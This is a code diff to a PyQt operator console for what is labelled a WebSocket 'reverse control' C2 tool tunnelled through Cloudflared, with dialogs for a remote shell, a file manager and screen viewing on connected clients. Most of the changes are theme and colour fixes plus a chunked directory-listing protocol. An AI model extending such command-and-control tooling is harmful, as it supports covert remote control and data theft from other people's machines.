@@ -292,12 +292,13 @@ class RemoteCmdDialog(QDialog):
         self.client.send_packet(b"SPAW")
 
         if parent and hasattr(parent, 'is_dark_mode'):
-            self.apply_theme(parent.is_dark_mode, parent.fg_color)
+            self.apply_theme(parent.is_dark_mode, parent.get_fg())
 
     def apply_theme(self, dark: bool, fg_color: str = "#00ff00"):
         if dark:
             self.setStyleSheet(f"""
                 QDialog {{ background-color: {DARK_BG}; }}
+                QWidget {{ background-color: {DARK_BG}; color: {fg_color}; }}
                 QLabel {{ color: {fg_color}; }}
                 QTextEdit {{
                     background-color: {DARK_BG};
@@ -310,11 +311,30 @@ class RemoteCmdDialog(QDialog):
                     color: {fg_color};
                     border: 1px solid {DARK_BORDER};
                     font-family: Consolas, "Courier New", monospace;
+                }}
+                QPushButton {{
+                    background-color: {DARK_BTN_BG};
+                    color: {fg_color};
+                    border: 1px solid {DARK_BORDER};
+                    padding: 4px 10px;
+                    font-family: Consolas, "Courier New", monospace;
+                }}
+                QPushButton:hover {{ background-color: {DARK_BTN_HOVER}; }}
+                QMenu {{
+                    background-color: {DARK_BG};
+                    color: {fg_color};
+                    border: 1px solid {DARK_BORDER};
+                    font-family: Consolas, "Courier New", monospace;
+                }}
+                QMenu::item:selected {{
+                    background-color: {DARK_SEL_BG};
+                    color: {fg_color};
                 }}
             """)
         else:
             self.setStyleSheet(f"""
                 QDialog {{ background-color: {LIGHT_BG}; }}
+                QWidget {{ background-color: {LIGHT_BG}; color: {fg_color}; }}
                 QLabel {{ color: {fg_color}; }}
                 QTextEdit {{
                     background-color: {LIGHT_BG};
@@ -327,6 +347,24 @@ class RemoteCmdDialog(QDialog):
                     color: {fg_color};
                     border: 1px solid {LIGHT_BORDER};
                     font-family: Consolas, "Courier New", monospace;
+                }}
+                QPushButton {{
+                    background-color: {LIGHT_BTN_BG};
+                    color: {fg_color};
+                    border: 1px solid {LIGHT_BORDER};
+                    padding: 4px 10px;
+                    font-family: Consolas, "Courier New", monospace;
+                }}
+                QPushButton:hover {{ background-color: {LIGHT_BTN_HOVER}; }}
+                QMenu {{
+                    background-color: {LIGHT_BG};
+                    color: {fg_color};
+                    border: 1px solid {LIGHT_BORDER};
+                    font-family: Consolas, "Courier New", monospace;
+                }}
+                QMenu::item:selected {{
+                    background-color: {LIGHT_SEL_BG};
+                    color: {fg_color};
                 }}
             """)
 
@@ -384,7 +422,8 @@ class FileManagerDialog(QDialog):
         self.upload_inflight = 0
         self.upload_path = ""
         self.fs_events = []
-        self.pending_op = None   # ("del"/"ren"/"mkd", detail)
+        self.pending_op = None
+        self._fdir_dir_id = None   # 当前正在接收的 FDIR dir_id
 
         lay = QVBoxLayout(self)
         path_lay = QHBoxLayout()
@@ -429,12 +468,13 @@ class FileManagerDialog(QDialog):
 
         log_console(f"[文件管理] 打开 {client_session.display_name}")
         if parent and hasattr(parent, 'is_dark_mode'):
-            self.apply_theme(parent.is_dark_mode, parent.fg_color)
+            self.apply_theme(parent.is_dark_mode, parent.get_fg())
 
     def apply_theme(self, dark: bool, fg_color: str = "#00ff00"):
         if dark:
             self.setStyleSheet(f"""
                 QDialog {{ background-color: {DARK_BG}; }}
+                QWidget {{ background-color: {DARK_BG}; color: {fg_color}; }}
                 QLabel {{ color: {fg_color}; }}
                 QLineEdit {{
                     background-color: {DARK_BG};
@@ -481,10 +521,21 @@ class FileManagerDialog(QDialog):
                     font-family: Consolas, "Courier New", monospace;
                 }}
                 QProgressBar::chunk {{ background-color: {DARK_PROGRESS_CHUNK}; }}
+                QMenu {{
+                    background-color: {DARK_BG};
+                    color: {fg_color};
+                    border: 1px solid {DARK_BORDER};
+                    font-family: Consolas, "Courier New", monospace;
+                }}
+                QMenu::item:selected {{
+                    background-color: {DARK_SEL_BG};
+                    color: {fg_color};
+                }}
             """)
         else:
             self.setStyleSheet(f"""
                 QDialog {{ background-color: {LIGHT_BG}; }}
+                QWidget {{ background-color: {LIGHT_BG}; color: {fg_color}; }}
                 QLabel {{ color: {fg_color}; }}
                 QLineEdit {{
                     background-color: {LIGHT_BG};
@@ -530,6 +581,16 @@ class FileManagerDialog(QDialog):
                     font-family: Consolas, "Courier New", monospace;
                 }}
                 QProgressBar::chunk {{ background-color: {LIGHT_PROGRESS_CHUNK}; }}
+                QMenu {{
+                    background-color: {LIGHT_BG};
+                    color: {fg_color};
+                    border: 1px solid {LIGHT_BORDER};
+                    font-family: Consolas, "Courier New", monospace;
+                }}
+                QMenu::item:selected {{
+                    background-color: {LIGHT_SEL_BG};
+                    color: {fg_color};
+                }}
             """)
 
     def log(self, msg):
@@ -558,15 +619,25 @@ class FileManagerDialog(QDialog):
             drives = [d for d in text.split("|") if d]
             log_console(f"[文件管理] FDRV 驱动器: {drives}")
             self.tree.clear()
+            self._fdir_dir_id = None
             for d in drives:
                 d_full = d if d.endswith("\\") else d + "\\"
                 item = QTreeWidgetItem([d_full, "", "驱动器", d_full])
                 self.tree.addTopLevelItem(item)
 
         elif cmd == b"FDIR":
-            text = payload.decode("gbk", errors="replace")
-            log_console(f"[文件管理] FDIR 长度={len(text)}")
-            self.tree.clear()
+            # 新格式：[4B dir_id][1B is_last][payload]
+            if len(payload) < 5:
+                log_console("[文件管理] FDIR 载荷过短")
+                return
+            dir_id = struct.unpack("<I", payload[0:4])[0]
+            is_last = payload[4] != 0
+            text = payload[5:].decode("gbk", errors="replace")
+
+            if self._fdir_dir_id != dir_id:
+                self._fdir_dir_id = dir_id
+                self.tree.clear()
+
             for entry in text.split(";"):
                 if not entry: continue
                 parts = entry.split("|")
@@ -580,6 +651,9 @@ class FileManagerDialog(QDialog):
                 type_str = "目录" if typ == "D" else "文件"
                 item = QTreeWidgetItem([name, size_str, type_str, full])
                 self.tree.addTopLevelItem(item)
+
+            if is_last:
+                log_console(f"[文件管理] FDIR 完成 dir_id={dir_id}")
 
         elif cmd == b"FMET":
             text = payload.decode("gbk", errors="replace")
@@ -736,6 +810,8 @@ class FileManagerDialog(QDialog):
         if path:
             self.current_path = path
             log_console(f"[文件管理] 转到 {path}")
+            self.tree.clear()
+            self._fdir_dir_id = None
             self.client.send_packet(b"FDIR" + path.encode("gbk", errors="replace"))
 
     def on_up(self):
@@ -747,17 +823,25 @@ class FileManagerDialog(QDialog):
             log_console("[文件管理] 回到驱动器列表")
             self.client.send_packet(b"FDRV")
             self.current_path = ""
+            self.tree.clear()
+            self._fdir_dir_id = None
         else:
             self.current_path = p[:idx]
             self.path_edit.setText(self.current_path)
             log_console(f"[文件管理] 上级到 {self.current_path}")
+            self.tree.clear()
+            self._fdir_dir_id = None
             self.client.send_packet(b"FDIR" + self.current_path.encode("gbk", errors="replace"))
 
     def on_refresh(self):
         log_console("[文件管理] 刷新")
         if self.current_path:
+            self.tree.clear()
+            self._fdir_dir_id = None
             self.client.send_packet(b"FDIR" + self.current_path.encode("gbk", errors="replace"))
         else:
+            self.tree.clear()
+            self._fdir_dir_id = None
             self.client.send_packet(b"FDRV")
 
     def on_double_click(self, item, col):
@@ -767,6 +851,8 @@ class FileManagerDialog(QDialog):
             self.current_path = full
             self.path_edit.setText(full)
             log_console(f"[文件管理] 双击进入 {full}")
+            self.tree.clear()
+            self._fdir_dir_id = None
             self.client.send_packet(b"FDIR" + full.encode("gbk", errors="replace"))
         elif typ == "文件":
             log_console(f"[文件管理] 双击下载 {full}")
@@ -875,6 +961,7 @@ class FileManagerDialog(QDialog):
         self.upload_inflight = 0
         self.upload_path = ""
         self.pending_op = None
+        self._fdir_dir_id = None
         self.progress_bar.setValue(0)
         self.progress_label.setText("")
 
@@ -978,7 +1065,7 @@ class ScreenPreviewDialog(QDialog):
         lay.addWidget(self.log_box)
 
         if parent and hasattr(parent, 'is_dark_mode'):
-            self.apply_theme(parent.is_dark_mode, parent.fg_color)
+            self.apply_theme(parent.is_dark_mode, parent.get_fg())
 
         self._update_mode_label()
         log_console(f"[截屏] 打开窗口 {client_session.display_name}")
@@ -995,6 +1082,7 @@ class ScreenPreviewDialog(QDialog):
         if dark:
             self.setStyleSheet(f"""
                 QDialog {{ background-color: {DARK_BG}; }}
+                QWidget {{ background-color: {DARK_BG}; color: {fg_color}; }}
                 QLabel {{ color: {fg_color}; }}
                 QCheckBox {{ color: {fg_color}; }}
                 QTextEdit {{
@@ -1024,6 +1112,7 @@ class ScreenPreviewDialog(QDialog):
         else:
             self.setStyleSheet(f"""
                 QDialog {{ background-color: {LIGHT_BG}; }}
+                QWidget {{ background-color: {LIGHT_BG}; color: {fg_color}; }}
                 QLabel {{ color: {fg_color}; }}
                 QCheckBox {{ color: {fg_color}; }}
                 QTextEdit {{
@@ -1430,16 +1519,16 @@ class MainWindow(QMainWindow):
         super().__init__()
         self.base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
         self.is_dark_mode = False
-        self.fg_color = "#00ff00"
+        self.fg_color = None      # None = 主题默认（日间黑 / 夜间白）
+        self.client_model = ClientListModel()
+        self.open_cmd_dialogs = {}
+        self.open_file_dialogs = {}
+        self.open_screen_dialogs = {}
 
         self.setWindowTitle("WebSocket 反向控制主控端 (Cloudflared Tunnel 模式)")
         self.resize(720, 520)
         self.server_sock = None
         self.server_running = False
-        self.client_model = ClientListModel()
-        self.open_cmd_dialogs = {}
-        self.open_file_dialogs = {}
-        self.open_screen_dialogs = {}
 
         w = QWidget()
         self.setCentralWidget(w)
@@ -1457,6 +1546,9 @@ class MainWindow(QMainWindow):
         self.btn_color = QPushButton("🎨 字体颜色")
         self.btn_color.clicked.connect(self.choose_color)
         top_lay.addWidget(self.btn_color)
+        self.btn_reset_color = QPushButton("↺ 恢复默认色")
+        self.btn_reset_color.clicked.connect(self.reset_color)
+        top_lay.addWidget(self.btn_reset_color)
         self.btn_theme = QPushButton("🌙 夜间模式"); self.btn_theme.clicked.connect(self.toggle_theme)
         top_lay.addWidget(self.btn_theme)
         lay.addLayout(top_lay)
@@ -1479,16 +1571,28 @@ class MainWindow(QMainWindow):
         self.apply_theme(False)
         log_console("[C2] 启动，等待监听")
 
+    def get_fg(self):
+        """取当前字体色：用户自定义优先，否则主题默认。"""
+        if self.fg_color:
+            return self.fg_color
+        return "#ffffff" if self.is_dark_mode else "#000000"
+
     def choose_color(self):
-        color = QColorDialog.getColor(QColor(self.fg_color), self, "选择字体颜色")
+        cur = self.get_fg()
+        color = QColorDialog.getColor(QColor(cur), self, "选择字体颜色")
         if color.isValid():
             self.fg_color = color.name()
             log_console(f"[C2] 字体颜色 -> {self.fg_color}")
             self.apply_theme(self.is_dark_mode)
 
+    def reset_color(self):
+        self.fg_color = None
+        log_console("[C2] 字体颜色恢复主题默认")
+        self.apply_theme(self.is_dark_mode)
+
     def apply_theme(self, dark: bool):
         self.is_dark_mode = dark
-        fg = self.fg_color
+        fg = self.get_fg()
         if dark:
             self.setStyleSheet(f"""
                 QMainWindow {{ background-color: {DARK_BG}; }}
@@ -1968,7 +2072,7 @@ class MainWindow(QMainWindow):
                 else:
                     del self.open_cmd_dialogs[sess]
             dlg = RemoteCmdDialog(sess, parent=self)
-            dlg.apply_theme(self.is_dark_mode, self.fg_color)
+            dlg.apply_theme(self.is_dark_mode, self.get_fg())
             self.open_cmd_dialogs[sess] = dlg
             dlg.show()
         elif ret == act_file:
@@ -1981,7 +2085,7 @@ class MainWindow(QMainWindow):
                     dlg._closing = True
                     del self.open_file_dialogs[sess]
             dlg = FileManagerDialog(sess, parent=self)
-            dlg.apply_theme(self.is_dark_mode, self.fg_color)
+            dlg.apply_theme(self.is_dark_mode, self.get_fg())
             self.open_file_dialogs[sess] = dlg
             dlg.show()
         elif ret == act_screen:
@@ -1994,7 +2098,7 @@ class MainWindow(QMainWindow):
                     dlg._closing = True
                     del self.open_screen_dialogs[sess]
             dlg = ScreenPreviewDialog(sess, parent=self)
-            dlg.apply_theme(self.is_dark_mode, self.fg_color)
+            dlg.apply_theme(self.is_dark_mode, self.get_fg())
             self.open_screen_dialogs[sess] = dlg
             dlg.show()
 
